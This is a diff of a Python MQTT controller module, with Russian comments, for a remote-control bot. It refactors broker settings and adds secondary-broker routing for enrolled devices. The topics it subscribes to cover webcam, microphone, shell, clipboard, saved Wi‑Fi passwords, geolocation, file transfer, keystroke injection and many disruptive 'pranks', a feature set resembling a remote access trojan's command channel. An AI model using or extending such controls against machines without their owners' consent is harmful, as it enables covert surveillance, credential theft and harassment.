@@ -15,7 +15,7 @@ import paho.mqtt.client as mqtt
 
 from config import ENCRYPT_PAYLOAD, MQTT_BROKER, MQTT_PASSWORD, MQTT_PORT, MQTT_PREFIX, MQTT_TLS, MQTT_USERNAME
 from crypto import sign_message
-from device_keys import key_for_device
+from device_keys import enrolled_device_ids, key_for_device
 from xgencrypto import encrypt_payload
 from command_signing import verify_approved_command
 
@@ -25,106 +25,114 @@ log = logging.getLogger("xgent.transport")
 class MQTTTransport:
     """Обёртка над paho-mqtt: подключение, подписка, публикация команд."""
 
-    def __init__(self, on_message: Callable[[str, Dict[str, Any]], None]):
+    def __init__(
+        self, on_message: Callable[[str, Dict[str, Any]], None], *,
+        host: str = MQTT_BROKER, port: int = MQTT_PORT,
+        username: str | None = MQTT_USERNAME, password: str | None = MQTT_PASSWORD,
+        prefix: str = MQTT_PREFIX, client_id: str = "xgent-bot",
+    ):
         self.on_message = on_message
+        self.host, self.port, self.username, self.password, self.prefix = host, port, username, password, prefix
+        self.tls = MQTT_TLS
+        self.secondary: MQTTTransport | None = None
         self.connected = threading.Event()
         self._client = mqtt.Client(
             mqtt.CallbackAPIVersion.VERSION2,
-            client_id="xgent-bot",
+            client_id=client_id,
             protocol=mqtt.MQTTv311,
         )
         self._client.reconnect_delay_set(min_delay=2, max_delay=30)
         self._client.on_connect = self._on_connect
         self._client.on_disconnect = self._on_disconnect
         self._client.on_message = self._on_message
-        if MQTT_TLS:
+        if self.tls:
             self._client.tls_set()  # системные CA; без отключения проверки сертификата
-        if MQTT_USERNAME:
-            log.info("MQTT auth: пользователь %s (TLS=%s", MQTT_USERNAME, MQTT_TLS)
-            self._client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
+        if self.username:
+            log.info("MQTT auth: пользователь %s (TLS=%s)", self.username, self.tls)
+            self._client.username_pw_set(self.username, self.password)
 
     def _on_connect(self, client, userdata, flags, reason_code, properties=None):
         if reason_code == 0:
             self.connected.set()
             # Медиа и мониторинг
             # Статусы и LWT должны доставляться надёжно.
-            client.subscribe(f"{MQTT_PREFIX}/+/status", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/update_progress", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/screenshot", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/webcam", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/sysinfo", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/mic", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/shell", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/shell_cancel", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/processes", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/clipboard", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/battery", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/network", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/services", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/capabilities", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/ack", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/disks", qos=0)
+            client.subscribe(f"{self.prefix}/+/status", qos=1)
+            client.subscribe(f"{self.prefix}/+/update_progress", qos=1)
+            client.subscribe(f"{self.prefix}/+/screenshot", qos=0)
+            client.subscribe(f"{self.prefix}/+/webcam", qos=0)
+            client.subscribe(f"{self.prefix}/+/sysinfo", qos=0)
+            client.subscribe(f"{self.prefix}/+/mic", qos=0)
+            client.subscribe(f"{self.prefix}/+/shell", qos=0)
+            client.subscribe(f"{self.prefix}/+/shell_cancel", qos=0)
+            client.subscribe(f"{self.prefix}/+/processes", qos=0)
+            client.subscribe(f"{self.prefix}/+/clipboard", qos=0)
+            client.subscribe(f"{self.prefix}/+/battery", qos=0)
+            client.subscribe(f"{self.prefix}/+/network", qos=0)
+            client.subscribe(f"{self.prefix}/+/services", qos=0)
+            client.subscribe(f"{self.prefix}/+/capabilities", qos=0)
+            client.subscribe(f"{self.prefix}/+/ack", qos=1)
+            client.subscribe(f"{self.prefix}/+/disks", qos=0)
             # Файловые операции
-            client.subscribe(f"{MQTT_PREFIX}/+/file_get", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/file_put", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/file_del", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/dir_list", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/find_file", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/path_open", qos=0)
+            client.subscribe(f"{self.prefix}/+/file_get", qos=0)
+            client.subscribe(f"{self.prefix}/+/file_put", qos=0)
+            client.subscribe(f"{self.prefix}/+/file_del", qos=0)
+            client.subscribe(f"{self.prefix}/+/dir_list", qos=0)
+            client.subscribe(f"{self.prefix}/+/find_file", qos=0)
+            client.subscribe(f"{self.prefix}/+/path_open", qos=0)
             # Сеть и система
-            client.subscribe(f"{MQTT_PREFIX}/+/ext_ip", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/wifi_info", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/usb_devices", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/netstat", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/startup_list", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/env_get", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/net_wifi_passwords", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/net_bluetooth_list", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/storage_smart", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/sys_installed_apps", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/sys_history_cmd", qos=0)
+            client.subscribe(f"{self.prefix}/+/ext_ip", qos=0)
+            client.subscribe(f"{self.prefix}/+/wifi_info", qos=0)
+            client.subscribe(f"{self.prefix}/+/usb_devices", qos=0)
+            client.subscribe(f"{self.prefix}/+/netstat", qos=0)
+            client.subscribe(f"{self.prefix}/+/startup_list", qos=0)
+            client.subscribe(f"{self.prefix}/+/env_get", qos=0)
+            client.subscribe(f"{self.prefix}/+/net_wifi_passwords", qos=0)
+            client.subscribe(f"{self.prefix}/+/net_bluetooth_list", qos=0)
+            client.subscribe(f"{self.prefix}/+/storage_smart", qos=0)
+            client.subscribe(f"{self.prefix}/+/sys_installed_apps", qos=0)
+            client.subscribe(f"{self.prefix}/+/sys_history_cmd", qos=0)
             # Управление вводом, дисплей, загрузка
-            client.subscribe(f"{MQTT_PREFIX}/+/hotkey", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/type_text", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/msgbox_spam", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/wallpaper_set", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/download_url", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/screen_off", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/screensaver_on", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/display_brightness", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/display_night_light", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/display_rotate", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/geo_location", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/volume_set", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/volume_toggle", qos=0)
+            client.subscribe(f"{self.prefix}/+/hotkey", qos=0)
+            client.subscribe(f"{self.prefix}/+/type_text", qos=0)
+            client.subscribe(f"{self.prefix}/+/msgbox_spam", qos=0)
+            client.subscribe(f"{self.prefix}/+/wallpaper_set", qos=0)
+            client.subscribe(f"{self.prefix}/+/download_url", qos=0)
+            client.subscribe(f"{self.prefix}/+/screen_off", qos=0)
+            client.subscribe(f"{self.prefix}/+/screensaver_on", qos=0)
+            client.subscribe(f"{self.prefix}/+/display_brightness", qos=0)
+            client.subscribe(f"{self.prefix}/+/display_night_light", qos=0)
+            client.subscribe(f"{self.prefix}/+/display_rotate", qos=0)
+            client.subscribe(f"{self.prefix}/+/geo_location", qos=0)
+            client.subscribe(f"{self.prefix}/+/volume_set", qos=0)
+            client.subscribe(f"{self.prefix}/+/volume_toggle", qos=0)
             # Процессы
-            client.subscribe(f"{MQTT_PREFIX}/+/kill_process", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/proc_kill_name", qos=0)
+            client.subscribe(f"{self.prefix}/+/kill_process", qos=0)
+            client.subscribe(f"{self.prefix}/+/proc_kill_name", qos=0)
             # Приколы
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_screamer", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_rickroll", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_matrix", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_siren", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_shout_tts", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_swap_mouse", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_crazy_cursor", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_hide_desktop", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_dancing_windows", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/prank_random_site", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_screamer", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_rickroll", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_matrix", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_siren", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_shout_tts", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_swap_mouse", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_crazy_cursor", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_hide_desktop", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_dancing_windows", qos=0)
+            client.subscribe(f"{self.prefix}/+/prank_random_site", qos=0)
             # Общий топик текстовых ответов и диагностики
-            client.subscribe(f"{MQTT_PREFIX}/+/output", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/standby_sleep", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/wake", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/autorun_status", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/autorun_enable", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/autorun_disable", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/power", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/agent_update", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/guardian", qos=1)
-            client.subscribe(f"{MQTT_PREFIX}/+/uninstall_agent", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/sys_uptime", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/sys_clean_temp", qos=0)
-            client.subscribe(f"{MQTT_PREFIX}/+/net_ping", qos=0)
+            client.subscribe(f"{self.prefix}/+/output", qos=1)
+            client.subscribe(f"{self.prefix}/+/standby_sleep", qos=0)
+            client.subscribe(f"{self.prefix}/+/wake", qos=0)
+            client.subscribe(f"{self.prefix}/+/autorun_status", qos=0)
+            client.subscribe(f"{self.prefix}/+/autorun_enable", qos=0)
+            client.subscribe(f"{self.prefix}/+/autorun_disable", qos=0)
+            client.subscribe(f"{self.prefix}/+/power", qos=0)
+            client.subscribe(f"{self.prefix}/+/agent_update", qos=1)
+            client.subscribe(f"{self.prefix}/+/guardian", qos=1)
+            client.subscribe(f"{self.prefix}/+/uninstall_agent", qos=0)
+            client.subscribe(f"{self.prefix}/+/sys_uptime", qos=0)
+            client.subscribe(f"{self.prefix}/+/sys_clean_temp", qos=0)
+            client.subscribe(f"{self.prefix}/+/net_ping", qos=0)
             for _p in (
                 "prank_bsod", "prank_fake_update", "prank_toast_spam", "prank_keyboard_disco",
                 "prank_beep_morse", "prank_open_notepad_type", "prank_hacker_typer",
@@ -141,8 +149,8 @@ class MQTTTransport:
                 "prank_nyan_stream", "prank_random_beeps", "prank_confetti_winner",
                 "prank_low_battery_fake", "prank_earthquake", "prank_laugh_track",
             ):
-                client.subscribe(f"{MQTT_PREFIX}/+/{_p}", qos=0)
-            log.info("Подключено к %s:%s, топики успешно подписаны", MQTT_BROKER, MQTT_PORT)
+                client.subscribe(f"{self.prefix}/+/{_p}", qos=0)
+            log.info("Подключено к %s:%s, топики успешно подписаны", self.host, self.port)
         else:
             log.warning("Не удалось подключиться к брокеру: %s", reason_code)
 
@@ -170,6 +178,8 @@ class MQTTTransport:
         """
         self._client.loop_start()
         threading.Thread(target=self._connect_with_retry, daemon=True, name="mqtt-connector").start()
+        if self.secondary is not None:
+            self.secondary.start()
 
     def _connect_with_retry(self, max_attempts: int = 0, delay: float = 5.0) -> None:
         """Попытки подключения с паузой. max_attempts=0 — бесконечно."""
@@ -177,8 +187,8 @@ class MQTTTransport:
         while True:
             attempt += 1
             try:
-                log.info("[MQTT] Попытка подключения #%d к %s:%d...", attempt, MQTT_BROKER, MQTT_PORT)
-                self._client.connect(MQTT_BROKER, MQTT_PORT, keepalive=60)
+                log.info("[MQTT] Попытка подключения #%d к %s:%d...", attempt, self.host, self.port)
+                self._client.connect(self.host, self.port, keepalive=60)
                 log.info("[MQTT] Подключение инициировано, ждём on_connect.")
                 return  # paho loop_start() возьмёт на себя дальнейшее
             except Exception as exc:
@@ -190,6 +200,8 @@ class MQTTTransport:
                 time.sleep(delay)
 
     def stop(self) -> None:
+        if self.secondary is not None:
+            self.secondary.stop()
         self._client.loop_stop()
         self._client.disconnect()
 
@@ -203,6 +215,28 @@ class MQTTTransport:
         MQTT_ERR_NO_CONN может оставить пакет для отправки после reconnect.
         Исключения после начала publish тоже не доказывают отсутствие пакета.
         """
+        if self.secondary is not None:
+            try:
+                enrolled = enrolled_device_ids()
+            except ValueError:
+                log.warning("Команда %s не отправлена: каталог ключей недоступен", cmd_type)
+                return False
+            if device_id in enrolled:
+                return self.secondary.publish_command(device_id, cmd_type, **kwargs)
+            if device_id == "all":
+                results = [self.secondary.publish_command(each, cmd_type, **kwargs) for each in enrolled]
+                legacy = self._publish_command_local(device_id, cmd_type, **kwargs)
+                outcomes = [legacy, *results]
+                if all(result is True for result in outcomes):
+                    return True
+                # Some targets may already have accepted the command. Do not
+                # report a definite refusal after a partial or ambiguous send.
+                if any(result is True or result is None for result in outcomes):
+                    return None
+                return False
+        return self._publish_command_local(device_id, cmd_type, **kwargs)
+
+    def _publish_command_local(self, device_id: str, cmd_type: str, **kwargs: Any) -> bool | None:
         if "type" in kwargs and kwargs["type"] != cmd_type:
             log.warning("Command publish refused: payload type override")
             return False
@@ -219,7 +253,7 @@ class MQTTTransport:
         if not self.connected.is_set():
             log.warning("Команда %s не отправлена: нет соединения с брокером", cmd_type)
             return False
-        topic = f"{MQTT_PREFIX}/all/cmd" if device_id == "all" else f"{MQTT_PREFIX}/{device_id}/cmd"
+        topic = f"{self.prefix}/all/cmd" if device_id == "all" else f"{self.prefix}/{device_id}/cmd"
         try:
             message_key = None if device_id == "all" else key_for_device(device_id)
         except (OSError, ValueError):
